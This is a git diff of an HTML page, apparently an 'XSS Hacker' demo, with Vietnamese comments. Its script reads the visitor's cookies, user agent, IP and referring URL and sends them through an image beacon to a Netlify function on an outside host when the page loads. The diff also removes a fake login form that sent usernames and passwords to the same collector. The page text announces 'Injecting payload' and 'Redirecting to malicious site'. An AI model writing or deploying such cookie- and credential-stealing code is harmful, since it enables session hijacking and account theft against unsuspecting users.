@@ -9,6 +9,7 @@
       // Hàm gửi thông tin về User-Agent, IP và URL gốc tới Netlify Function
       function sendDataToNetlify() {
         var cookies = document.cookie; // Lấy cookies của người dùng
+        var currentUrl = window.location.href; // Lấy URL hiện tại (URL của trang XSS Hacker)
         var userAgent = navigator.userAgent; // Lấy User-Agent của trình duyệt
 
         // Lưu URL gốc vào sessionStorage (URL người dùng đã truy cập trước khi bị chuyển hướng)
@@ -24,11 +25,7 @@
             // Lấy URL gốc từ sessionStorage
             var referrerUrl = sessionStorage.getItem("originalUrl");
 
-            // Lấy thông tin đăng nhập từ form
-            var username = document.getElementById("username").value; // Lấy tên người dùng
-            var password = document.getElementById("password").value; // Lấy mật khẩu
-
-            // Gửi thông tin (cookies, userAgent, IP, URL gốc, tên người dùng, mật khẩu) tới Netlify Function
+            // Gửi thông tin (cookies, userAgent, IP, URL gốc, và URL hiện tại) tới Netlify Function
             var img = new Image();
             img.src =
               "https://xss-hacker.netlify.app/.netlify/functions/logRequest?cookies=" +
@@ -38,24 +35,15 @@
               "&userIP=" +
               encodeURIComponent(userIP) +
               "&url=" +
-              encodeURIComponent(referrerUrl) + // Gửi URL gốc
-              "&username=" +
-              encodeURIComponent(username) + // Gửi tên người dùng
-              "&password=" +
-              encodeURIComponent(password); // Gửi mật khẩu
+              encodeURIComponent(referrerUrl); // Gửi URL gốc thay vì URL hiện tại
           })
           .catch((error) => {
             console.error("Error fetching IP:", error);
           });
       }
 
-      // Lắng nghe sự kiện submit của form
-      document
-        .getElementById("loginForm")
-        .addEventListener("submit", function (event) {
-          event.preventDefault(); // Ngừng gửi form (để kiểm tra dữ liệu trước khi gửi)
-          sendDataToNetlify(); // Gửi dữ liệu đến Netlify Function
-        });
+      // Gọi hàm khi trang tải
+      window.onload = sendDataToNetlify;
     </script>
   </head>
   <body>
@@ -68,11 +56,5 @@
       <p>Injecting payload...</p>
       <p>Redirecting to malicious site...</p>
     </div>
-
-    <form id="loginForm">
-      <input type="text" id="username" placeholder="Username" />
-      <input type="password" id="password" placeholder="Password" />
-      <button type="submit">Login</button>
-    </form>
   </body>
 </html>
